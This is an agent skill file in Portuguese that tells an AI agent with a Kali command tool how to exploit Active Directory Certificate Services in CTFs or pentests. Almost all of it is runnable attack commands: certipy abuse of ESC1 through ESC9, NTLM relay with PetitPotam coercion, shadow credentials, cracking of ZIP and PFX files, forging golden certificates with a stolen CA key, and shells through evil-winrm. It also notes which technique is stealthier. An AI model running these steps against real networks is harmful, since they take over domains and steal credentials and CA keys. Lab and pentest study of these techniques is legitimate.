---
name: ctf-adcs
description: Use esta skill quando o usuário quiser explorar Active Directory Certificate Services (ADCS) em um CTF ou pentest e mencionar "ADCS", "certipy", "certificate services", "ESC1", "ESC2", "ESC3", "ESC4", "ESC7", "ESC8", "ESC9", "certutil", "template vulnerável", "forjar certificado", "shadow credentials", "PetitPotam", "NTLM relay LDAP", "golden certificate", "SSH CA", "certipy shadow", ou estiver buscando escalar via certificados.
argument-hint: <dc-ip> <domínio> <usuário:senha>
allowed-tools: [mcp__mcp-kali-server__execute_command]
---

# CTF ADCS — Active Directory Certificate Services Exploitation

Esta skill implementa uma metodologia estruturada para exploração de ADCS baseada em padrões da indústria para CTFs e laboratórios de segurança.

## Informações necessárias

- DC_IP: IP do Domain Controller
- DOMAIN: nome do domínio
- Credenciais válidas (USER:PASS ou hash)

## Fase 1 — Enumerar ADCS

```bash
# Via netexec (rápido)
netexec ldap <DC_IP> -u <USER> -p <PASS> -M adcs

# Via certipy (completo — gera .txt e .json)
certipy find -u <USER>@<DOMAIN> -p <PASS> -dc-ip <DC_IP> -vulnerable -stdout
certipy find -u <USER>@<DOMAIN> -p <PASS> -dc-ip <DC_IP> -output /tmp/certipy

# Parsear vulnerabilidades
cat /tmp/certipy.txt | grep -A 30 "\[!\]"
cat /tmp/certipy.txt | grep -E "ESC[0-9]"
```

**Checar sempre:**
- Nome da CA (`certipy find` → campo "Certificate Authorities")
- Templates com `[!]` (vulneráveis)
- Usuários/grupos que podem enrollar em cada template

## Fase 2 — ESC1: Enrollee-Supplied SAN

**Condições:**
- Template com `Client Authentication` EKU
- Flag `ENROLLEE_SUPPLIES_SUBJECT` habilitada
- Nosso usuário tem permissão de enrollar

```bash
# Solicitar certificado como Administrator
certipy req -u <USER>@<DOMAIN> -p <PASS> -dc-ip <DC_IP> \
  -ca '<CA_NAME>' -template '<VULN_TEMPLATE>' \
  -upn administrator@<DOMAIN>

# Autenticar e obter NTLM hash
certipy auth -pfx administrator.pfx -dc-ip <DC_IP>

# Usar hash
evil-winrm -i <DC_IP> -u Administrator -H <NTLM_HASH>
```

## Fase 3 — ESC3: Enrollment Agent

```bash
# Passo 1: Obter certificado de Enrollment Agent (template com EKU "Certificate Request Agent")
certipy req -u <USER>@<DOMAIN> -p <PASS> -dc-ip <DC_IP> \
  -ca '<CA_NAME>' -template '<ENROLLMENT_AGENT_TEMPLATE>'

# Passo 2: Usar agente para solicitar certificado em nome de Administrator
certipy req -u <USER>@<DOMAIN> -p <PASS> -dc-ip <DC_IP> \
  -ca '<CA_NAME>' -template '<TARGET_TEMPLATE>' \
  -on-behalf-of '<DOMAIN>\Administrator' \
  -pfx enrollment_agent.pfx

# Passo 3: Autenticar
certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
```

**Exemplo real:**
```bash
# Template "Delegated-CRA" = Enrollment Agent
# Template "DirectoryEmailReplication" = target template

certipy req -u ca_operator@<DOMAIN> -p <PASS> -dc-ip <DC_IP> \
  -ca '<CA_NAME>' -template 'Delegated-CRA'

certipy req -u ca_operator@<DOMAIN> -p <PASS> -dc-ip <DC_IP> \
  -ca '<CA_NAME>' -template 'DirectoryEmailReplication' \
  -on-behalf-of '<DOMAIN>\Administrator' -pfx ca_operator.pfx

certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
```

## Fase 4 — ESC4: Write Permission sobre Template

```bash
# Passo 1: Modificar template para torná-lo ESC1
certipy template -u <USER>@<DOMAIN> -p <PASS> -dc-ip <DC_IP> \
  -template '<TEMPLATE_NAME>' -save-old

# Passo 2: Agora solicitar com UPN customizado
certipy req -u <USER>@<DOMAIN> -p <PASS> -dc-ip <DC_IP> \
  -ca '<CA_NAME>' -template '<TEMPLATE_NAME>' \
  -upn administrator@<DOMAIN>

# Passo 3: Restaurar template
certipy template -u <USER>@<DOMAIN> -p <PASS> -dc-ip <DC_IP> \
  -template '<TEMPLATE_NAME>' -configuration '<TEMPLATE_NAME>.json'

certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
```

**Exemplo real:**
```bash
# Template "VulnerableComputer" vulnerável a ESC4
# Grupo de usuário tem GenericWrite sobre ele

# Modificar template para habilitar ENROLLEE_SUPPLIES_SUBJECT
certipy template -u <USER>@<DOMAIN> -p <PASS> -dc-ip <DC_IP> \
  -template VulnerableComputer -save-old

certipy req -u <USER>@<DOMAIN> -p <PASS> -dc-ip <DC_IP> \
  -ca '<CA_NAME>' -template VulnerableComputer \
  -upn administrator@<DOMAIN> -dns <DC_HOSTNAME>.<DOMAIN>
```

## Fase 5 — ESC7: CA Officer/Manager

**Condições:** Usuário tem `ManageCertificates` ou `ManageCA` na CA.

```bash
# Passo 1: Adicionar como Officer
certipy ca -u <USER>@<DOMAIN> -p <PASS> -dc-ip <DC_IP> \
  -ca '<CA_NAME>' -add-officer <USER>

# Passo 2: Habilitar template SubCA
certipy ca -u <USER>@<DOMAIN> -p <PASS> -dc-ip <DC_IP> \
  -ca '<CA_NAME>' -enable-template SubCA

# Passo 3: Solicitar (vai falhar — pending)
certipy req -u <USER>@<DOMAIN> -p <PASS> -dc-ip <DC_IP> \
  -ca '<CA_NAME>' -template SubCA -upn administrator@<DOMAIN>
# Anotar Request ID retornado

# Passo 4: Como Officer, forçar emissão do certificado pendente
certipy ca -u <USER>@<DOMAIN> -p <PASS> -dc-ip <DC_IP> \
  -ca '<CA_NAME>' -issue-request <REQUEST_ID>

# Passo 5: Recuperar certificado emitido
certipy req -u <USER>@<DOMAIN> -p <PASS> -dc-ip <DC_IP> \
  -ca '<CA_NAME>' -retrieve <REQUEST_ID>

certipy auth -pfx administrator.pfx -dc-ip <DC_IP>
```

## Fase 6 — ESC8: NTLM Relay para HTTP Enrollment

**Condições:** Web enrollment ativo em `http://<CA>/certsrv/`

```bash
# Verificar web enrollment
curl -s "http://<CA_IP>/certsrv/"

# Verificar LDAP signing
netexec ldap <DC_IP> -u <USER> -p <PASS> -M ldap-checker

# Passo 1: Configurar relay
ntlmrelayx.py -t http://<CA_IP>/certsrv/certfnsh.asp \
  -smb2support --adcs --template 'DomainController'

# Passo 2: Forçar autenticação do DC
# Habilitar WebClient service no alvo (necessário para coerção HTTP):
# Compilar EtwStartWebClient.cs e executar no alvo
# Ou via responder para capturar automaticamente

PetitPotam.py -d <DOMAIN> -u <USER> -p <PASS> <KALI_IP> <DC_IP>

# Passo 3: Usar certificado capturado
certipy auth -pfx <DC_HOSTNAME>.pfx -dc-ip <DC_IP>
```

## Fase 7 — ESC9: No Security Extension (UPN modification)

**Condições:**
- Template sem `szOID_NTDS_CA_SECURITY_EXT` extension
- Temos `GenericWrite` sobre uma conta

```bash
# Passo 1: Alterar UPN da conta comprometida para "Administrator"
certipy account update -u <USER>@<DOMAIN> -hashes :<HASH> \
  -user <TARGET_ACCOUNT> -upn administrator@<DOMAIN>

# Passo 2: Solicitar certificado (com UPN = Administrator)
certipy req -u <TARGET_ACCOUNT>@<DOMAIN> -hashes :<TARGET_HASH> \
  -ca '<CA_NAME>' -template '<TEMPLATE_WITHOUT_SECURITY_EXT>' -dc-ip <DC_IP>

# Passo 3: Restaurar UPN original
certipy account update -u <USER>@<DOMAIN> -hashes :<HASH> \
  -user <TARGET_ACCOUNT> -upn <ORIGINAL_UPN>

# Passo 4: Autenticar como Administrator
certipy auth -pfx administrator.pfx -domain <DOMAIN> -dc-ip <DC_IP>
```

## Fase 8 — Shadow Credentials (via machine account ou user)

```bash
# Adicionar shadow credential a uma conta
# Via pywhisker
pywhisker.py -d <DOMAIN> -u <USER> -p <PASS> --target <TARGET> \
  --action add -dc-ip <DC_IP>

# Via certipy (mais integrado)
certipy shadow auto -username <USER>@<DOMAIN> -password <PASS> \
  -account <TARGET> -dc-ip <DC_IP>
# Retorna: NT hash diretamente

# Via LDAP shell (após NTLM relay para LDAP)
# No prompt do ldap shell:
# set_shadow_creds <MACHINE>$
```

## Fase 9 — Certificate ZIP extraction

```bash
# Encontrar .zip com certificados em SMB share
smbclient //<DC_IP>/Shares -U '<DOMAIN>/<USER>%<PASS>'
# > get backup.zip

# Crackear ZIP protegido com senha
zip2john backup.zip > zip.hash
john zip.hash --wordlist=/usr/share/wordlists/rockyou.txt

# Extrair e crackear o .pfx dentro
unzip -P <senha> backup.zip
pfx2john.py backup_auth.pfx > pfx.hash
john pfx.hash --wordlist=/usr/share/wordlists/rockyou.txt

# Extrair crt e key do pfx
openssl pkcs12 -in backup_auth.pfx -nocerts -out privkey.pem -nodes -passin pass:<PFX_PASS>
openssl pkcs12 -in backup_auth.pfx -nokeys -out cert.pem -passin pass:<PFX_PASS>

# WinRM com certificado
evil-winrm -i <TARGET_IP> -S -c cert.pem -k privkey.pem
```

## Fase 10 — Golden Certificate (comprometer a CA)

```bash
# Se comprometemos a CA (Domain Admin ou ManageCA):
# Passo 1: Backup da CA (exportar chave privada)
certipy ca -u Administrator@<DOMAIN> -hashes :<NTLM_HASH> -dc-ip <DC_IP> \
  -ca '<CA_NAME>' -backup

# Ou via certutil no Windows:
certutil -exportPFX -p '<CA_PASS>' '<CA_NAME>' ca.pfx

# Passo 2: Forjar certificado offline para qualquer usuário
certipy forge -ca-pfx '<CA_NAME>.pfx' -upn administrator@<DOMAIN> \
  -subject 'CN=Administrator,CN=Users,DC=<DOMAIN>,DC=<TLD>'

# Passo 3: Autenticar com certificado forjado
certipy auth -pfx administrator_forged.pfx -domain <DOMAIN> -dc-ip <DC_IP>
```

## Fase 11 — Kerberos PKINIT auth

```bash
# Após obter certificado (formato .cer/.key):
kinit -X X509_user_identity=FILE:admin.cer,admin.key administrator@<DOMAIN>
# ou via certipy:
certipy auth -pfx admin.pfx -dc-ip <DC_IP>

# Converter entre formatos
certipy cert -pfx admin.pfx -nokey -out admin.crt
certipy cert -pfx admin.pfx -nocert -out admin.key
openssl pkcs12 -in admin.pfx -nocerts -out admin.key -nodes
openssl pkcs12 -in admin.pfx -nokeys -out admin.crt
```

## Troubleshooting frequente

| Erro | Solução |
|------|---------|
| `Clock skew too great` | `sudo ntpdate <DC_IP>` ou `faketime '+0 hours' certipy auth ...` |
| `KDC_ERR_CLIENT_NOT_TRUSTED` | Template sem Client Auth EKU — usar ESC diferente |
| `CERTIFICATE_TRUST_FAILURE` | `certipy auth -pfx x.pfx -extra-ca <CA_CERT>` |
| `KRB_AP_ERR_BAD_INTEGRITY` | Tentar `certipy auth -ldap-shell` |
| Template não aparece na listagem | Checar se usuário tem `Enroll` permission |
| ESC1: erro de SAN | Adicionar `-dns <DC_FQDN>` ao req |

## Checklist de Ataque ADCS

```
[ ] certipy find -vulnerable → ver todos os ESC types
[ ] Checar ManageCA/ManageCertificates → ESC7
[ ] Checar GenericWrite em template → ESC4
[ ] Checar Enrollment Agent templates → ESC3
[ ] Checar templates sem security extension → ESC9 (com GenericWrite em conta)
[ ] Checar web enrollment ativo (http://CA/certsrv) → ESC8
[ ] Shadow credentials (mais silencioso que reset de senha)
[ ] ZIP/PFX em SMB shares → zip2john + pfx2john
[ ] CA comprometida → certipy ca -backup → Golden Certificate
```
